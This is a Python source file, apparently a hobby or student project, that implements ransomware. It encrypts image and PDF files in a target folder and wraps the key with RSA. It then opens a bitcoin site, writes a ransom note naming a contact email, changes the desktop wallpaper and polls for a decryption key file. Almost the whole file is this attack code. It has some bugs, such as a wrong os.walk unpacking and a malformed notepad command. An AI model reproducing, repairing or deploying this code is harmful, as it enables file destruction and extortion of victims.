from cryptography.fernet import Fernet #generating encrypting and decrypting objects for symmetric key
import os # getting path in windows
import webbrowser #open browser on victim's system
import ctypes #change the victim's background
import urllib.request #downloading the picture from internet
import time #checking the interval and popup of warning message
import datetime #remaining time for victim
import subprocess #to create a new process for notepad for warning
from Crypto.PublicKey import RSA          
from Crypto.Cipher import AES,PKCS1_OAEP
import threading
import base64

class RansomWare:
    extension = ['png','jpg','pdf'] #types of files that needs encrypted
    
    def __init__(self):
        self.key=None
        self.crypt=None
        self.publicKey=None
        self.pathRoot=r'C:\Users\Multi Laptop 88 G\Desktop\Project'
        self.pathvictim=r'C:\Users\Multi Laptop 88 G\Desktop\Target' #path of victim
        self.massmail=r'C:\Users\Multi Laptop 88 G\Desktop\Crypto Projects' #path of the mail that is sent by the victim
    def DDA(self):
        self.key=ConnectionAbortedError()
            
        
    def generateKeys(self):
        self.key=Fernet.generate_key() #generates symmetric key
        self.crypt=Fernet(self.key)  #creates an object for encrytion and decryption methods

    def writing(self):              #writing symmetric key on textfile
        with open('symmetricKey.txt','wb') as t: 
            t.write(self.key)
    
    def encrypt_symmetric(self):
        with open('symmetricKey.txt','rb') as t:
            AESKey=t.read()
        with open('symmetricKey.txt','wb') as t:
            self.publicKey=RSA.import_key(open('public.txt').read())
            publicCrypt=PKCS1_OAEP.new(self.publicKey)
            encryptedAES=publicCrypt.encrypt(AESKey)  #encrypting the symmetric key
            t.write(encryptedAES)
        with open(f'{self.pathvictim}/sendme.txt','wb') as t:
            t.write(encryptedAES)
        self.key=encryptedAES
        self.crypt=None  #remove all objects

    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            # Read data from file
            data = f.read()
            if not encrypted:
                # Print file contents - [debugging]
                print(data)
                # Encrypt data from file
                _data = self.crypt.encrypt(data)
                # Log file encrypted and print encrypted contents - [debugging]
                print('> File encrpyted')
                #print(_data)

            else:
                # Decrypt data from file
                _data = self.crypt.decrypt(data)
                # Log file decrypted and print decrypted contents - [debugging]
                print('> File decrpyted')
                #print(_data)
        with open(file_path, 'wb') as fp:
            # Write encrypted/decrypted data to file using same filename to overwrite original file
            fp.write(_data)

    def crypt_system(self,encrypted=False):
        system=os.walk(self.pathvictim,topdown=True)
        for root, files in system:
            for file in files:
                file_path=os.path.join(root,file)
                if not file.split('.')[-1] in self.extension:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)

    def bitcoin(self):
        website='www.bitcoin.com'
        webbrowser.open(website)

    def crossword(self):
        testing='www.qualityhostonline.com'
        webbrowser.open(testing)
   
    def wallpaperChange(self):
        src=r"C:\Users\Multi Laptop 88 G\Desktop\Project\s.jpg"
        ctypes.windll.user32.SystemParametersInfoW(0x14,0,src,0x2)
    
    def testing(self):
        src=r"C:\Users\Multi Laptop 88 G\Desktop\Project\v.jpg"
        ctypes.windll.user32.SystemParametersInfoW(0x14,0,src,0x2)
    
    def note(self):
        with open('RansomNote.txt','w') as t:
            t.write(f'''
            Your system has been hacked!
            Please send the sendme.txt file located on your desktop on the address ijsKo_z0rjh@mail.com
            After which you will receive a set of instructions as to how to pay the ransom.
            Afte the confirmation that the payment has received, you will get the key which 
            you will place on the desktop and after sometime all your files will be decrypted!
            This is a military graded encryption so there is no use to crack or try anything, and don't
            touch the encrypted files as any tampering may cause them to irrecvoerable
            ''')
    #def restore_value(self):

    def ransomWarning(self):
        os.system("notepad.txt RansomNote.txt")
                    
    def auto_check(self):
        # Loop to check file and if file it will read key and then self.key + self.cryptor will be valid for decrypting-
        # -the files
        print('started') # Debugging/Testing
        while True:
            try:
                print('trying') # Debugging/Testing
                with open(f'{self.pathvictim}/desktop.txt', 'r') as f:
                    self.key = f.read()
                    self.crypt = Fernet(self.key)
                    # Decrpyt system once have file is found and we have cryptor with the correct key
                    self.crypt_system(encrypted=True)
                    print('decrypted') 
                    break
            except Exception as e:
                print(e) 
                pass
            time.sleep(10) # Debugging/Testing check for file on desktop ever 10 seconds
            #print('Checking for decryptedSymkey.txt')
    

def main():
    # testfile = r'D:\Coding\Python\RansomWare\RansomWare_Software\testfile.png'
    rw = RansomWare()
    rw.generateKeys()
    rw.crypt_system()
    rw.writing()
    rw.encrypt_symmetric()
    #rw.wallpaperChange()
    rw.bitcoin()
    rw.note()

    
    t1 = threading.Thread(target=rw.auto_check)

    
    print('> RansomWare: Attack completed on target machine and system is encrypted')
    print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine') 
    t1.start()
    #print('> RansomWare: Target machine has been un-encrypted') 
    print('> RansomWare: Completed')



if __name__ == '__main__':
    main()    
            













